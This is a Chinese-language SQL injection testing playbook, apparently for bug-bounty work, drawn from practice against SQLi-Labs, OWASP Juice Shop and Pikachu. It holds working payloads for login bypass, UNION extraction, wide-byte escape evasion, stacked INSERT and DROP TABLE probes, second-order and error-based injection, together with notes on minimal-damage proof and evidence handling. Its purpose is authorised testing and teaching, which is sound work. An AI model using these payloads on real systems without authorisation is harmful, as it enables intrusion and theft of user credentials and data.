---
name: sql-injection
category: sqli
source: 渗透/sqli-labs-closeout/patterns/sqli-labs-methodology.md
verified_in: [sqli-labs-lessons-1-65, juice-shop-sqli-login, juice-shop-sqli-union]
src_value: high
severity_ceiling: critical
requires_auth: false
payload_count: 4
---

# SQL 注入验证剧本（方法论增强版）

> 来源：SQLi-Labs 五步方法论 + OWASP Juice Shop 实战 payload 合并。先识别上下文，再选 payload，最小破坏证明。
> **实测记录（2026-08-23, Juice Shop 20.1.1）**：登录接口 `email: "admin@juice-sh.op'--"` 绕过密码校验，解锁 `Login Admin` 挑战。✅
> **实测记录（2026-08-23, SQLi-Labs 1-65 全关重打）**：宽字节/堆叠/二次注入/ORDER BY/随机表挑战全验证。✅

## 0. 靶场实测要点（先读）

- **SQLi-Labs 65 关全验证（2026-08-23）**：Less-1~22 基础注入（回显/报错/盲注/头注入/cookie/base64 cookie）、Less-23~31 过滤绕过（注释符/`or`/空格/select/union 过滤）、Less-32~37 宽字节+转义、Less-38~45 堆叠、Less-46~53 ORDER BY、Less-54~65 随机表挑战
- **宽字节注入三要素（Less-32/33/34 实测）**：① 连接字符集 GBK（`mysqli_set_charset($con,'gbk')` 或老环境默认）；② `%df%27` 原始字节（requests 会把 `%xx` 二次编码成 `%25xx`，用 Python 真 `\xdf` 或 curl）；③ **id 用 `0` 开头**（id=0 无结果才触发 UNION 回显；`1%df%27` 会命中 id=1 显示 Dumb 造成假象）
- ~~**PHP 8.3 mysqlnd 加固（Less-36/37 环境限制）**~~ **【2026-08-25 反转：此判定是误判】**：real_escape_string 确实插入 0x5C，但"转义在前、`SET NAMES gbk` 在后"的时序下 MySQL 将 `0xDF+0x5C` 吞成一个 GBK 双字节字符——引号照样逃逸。Hex 回显 `df 5c 27` + UNION 提取成功实锤。**Less-36/37 完全可利用**；当时失败的根因是测试工具把 `%df` 二次编码成 `%25df`（见下方二次编码坑）。**通用教训：判定 environment-limited 前，先用 Hex 回显/日志验证 payload 是否以原始字节到达服务器**
- **堆叠注入（Less-38~45）**：`1';INSERT INTO users(id,username,password) VALUES(999,'x','y')-- ` 验证 DB 落库（mysqli_multi_query）；POST 场景注意 username 可能被转义但 **password 裸拼**（注入点在 passwd）
- **二次注入（Less-24）**：注册 `admin'#`（INSERT 双引号包裹下单引号无害）→ 改密码时 username 单引号拼接 `#` 注释掉密码校验 → 任意改 admin 密码
- **ORDER BY 注入语义（Less-46~53）**：裸数字=列号（`ORDER BY 0` 报错 1054）；表达式=排序值（`ORDER BY 2 AND 1=1` → 键 1 按 id 排序 vs `ORDER BY 2` 按 username 排序——排序差异证明注入）；堆叠可用
- **随机表挑战（Less-54~65）**：challenges 库随机表名/secret 列名/24 位密钥；UNION 提取 information_schema 表名→列名（GROUP_CONCAT 一次取全）→secret→提交；**回显被数组映射锁死时（`$unames[$row['id']]`）改用 extractvalue 报错注入，数据在 PHP 异常日志侧**（php -S 重定向日志后 grep `XPATH syntax error: '~值'`）
- **requests 二次编码坑**：params 传 `%09` 会被编码成 `%2509`——用 Python 真 `\t` 或 curl 原样发送
- **PHP 8.3 兼容修复**：`mysqli_connect_errno($con)` → `mysqli_connect_errno()`（老靶场代码批量报错）
- **先分清 SQL vs NoSQL**：同名"搜索"接口可能走 NoSQL，也可能走 SQL——**用 `'` 报错信息区分**：`SQLITE_ERROR: incomplete input` 是 SQL（Juice Shop 20.1.1 `/rest/products/search` 实测为 SQLite）；表达式拼接/500 无 SQL 错误是 NoSQL。**不要凭版本记忆下结论，先用报错定性**
- **Pikachu 十种注入形态全实测（2026-08-23）**：数字型（`id=1 or 1=1`）、字符型（`' or 1=1-- `）、搜索型（`%' or 1=1-- `）、括号型（`') or 1=1-- `）、**宽字节**（`set character_set_client=gbk` 后 `%df%27` 原始字节发送吃转义符）、delete 型（`id=1 or 1=1`）、布尔盲注（`and 1=1/1=2` 响应差异）、时间盲注（`and sleep(3)`）、update 型（`#` 注释后续字段）、header 型（UA 注入补右括号 `x','y','z') #`）
- **宽字节注入两个坑**：① 连接字符集必须 GBK（utf8 下 `%df` 无效，MySQL 按 utf8 校验替换非法字节）；② `%df%27` 必须**原始字节**发送（URL 编码工具会把 % 二次编码成 %25，注入失败）
- **`#` 注释会吃掉语句尾部的右括号**：`values('1','127.0.0.1','x','y','z' #','*/*',...)` 报错 near ''——payload 必须自带 `)`（`x','y','z') #`）
- **登录 SQLi 是最稳入口**：字符串拼接型登录接口（`'--` / `' OR 1=1--`）几乎总是存在
- **报错信息泄露堆栈**：SQLite 错误页会直接输出 `SQLITE_ERROR: near "UNION": syntax error`——用错误信息快速确认 DB 类型与语法上下文
- **多括号包裹的查询用 `'))` 闭合**（2026-08-23 实测）：`WHERE ((name LIKE '%Q%' OR ...) AND deletedAt IS NULL) ORDER BY name` 结构下，`q=')) ORDER BY N--` 探测列数（9 列），`q=')) UNION SELECT ...--` 注入；`--` 后直接接 `%'` 会被注释掉，无需额外闭合
- **软删除商品可经 API 直接入篮**（Christmas Special 实测）：`POST /api/BasketItems {"ProductId": <软删除商品id>}` 不校验 deletedAt → 结算即触发业务影响判定
- **UNION 伪造登录行**（Ephemeral Accountant 实测）：`models.sequelize.query(sql, {model, plain:true})` 场景可用 `' UNION SELECT <全列字面量>--` 伪造任意用户登录（需精确列数，User 模型 13 列）

## 1. 识别

**五步流程（SQLi-Labs 方法论）**：
1. 记录目标 URL、参数、方法、cookie 状态、基线响应
2. 识别注入上下文：numeric（数字型）| string（单引号）| double-quote（双引号）| cookie | header | POST body | stacked（堆叠）
3. 用最小破坏证明：语法错误 → 布尔差异 → UNION 反射 → 时间延迟
4. 捕获证据：request / response 摘录 / 结论
5. 更新进度记录

### 上下文探测速查

| 上下文 | 探测 payload | 预期差异 |
|--------|-------------|----------|
| 数字型 | `?id=1 AND 1=1` vs `?id=1 AND 1=2` | 前者正常后者报错/空 |
| 字符型 | `?id=1'` → 报错 | 单引号打破闭合 |
| 双引号型 | `?id=1"` → 报错 | 双引号打破闭合 |
| Cookie/Header | `Cookie: id=1'--` | 服务端从非请求体取参 |
| 堆叠 | `?id=1; DROP TABLE--` | 多语句执行（⚠️ 只证明，不执行） |

## 2. Payload 序列

按优先级从最小破坏开始：

```sql
-- 1. 布尔盲注（最小破坏）
' AND 1=1--  /  ' AND 1=2--

-- 2. 语法错误探测（确认注入点）
'  /  "  /  ')  /  '))

-- 3. UNION SELECT（数据提取，需先枚举列数）
' ORDER BY 1--   →  递增直到报错确定列数
' UNION SELECT 1,2,3,...--  （列数匹配后替换为字段）

-- 4. 登录绕过（字符串拼接型，juice-shop 实战）
'--           -- 注释掉密码与状态检查
' OR 1=1--
admin'--
```

### 已知表结构速查（juice-shop 实战参考）

| 目标 | 列数 | 常用字段 |
|------|------|----------|
| Products 表 | 9 列 | id, name, description, price |
| Users 表 | 13 列 | id, email, password, role |

> SRC 场景先用 `ORDER BY` 枚举列数，再按需提取。提取只取字段结构证明，不批量导出。

## 3. 判定标准

confirmed 需同时满足：
- [ ] 注入 payload 与基线请求形成可复现差异（布尔/报错/时间/UNION 反射）
- [ ] UNION 提取出预期字段（或盲注逐字符验证成功）
- [ ] 串行复现 ≥2 次

## 4. 证据要求

按 `evidence-record.md`：
- 基线请求（无 payload）+ 注入请求完整对照
- 响应摘录显示差异（报错信息/记录数/回显字段）
- 提取数据只保留证明片段

## 5. SRC 适用边界

- 适用：任何带参数查询的 Web 应用（登录、搜索、详情页、排序）
- 不适用：全参数化查询/ORM 强约束后端（先验证再投入）
- ⚠️ 敏感操作：堆叠查询只证明可执行，绝不实际执行写操作；时间盲注控制延时 ≤3s 避免拖垮目标
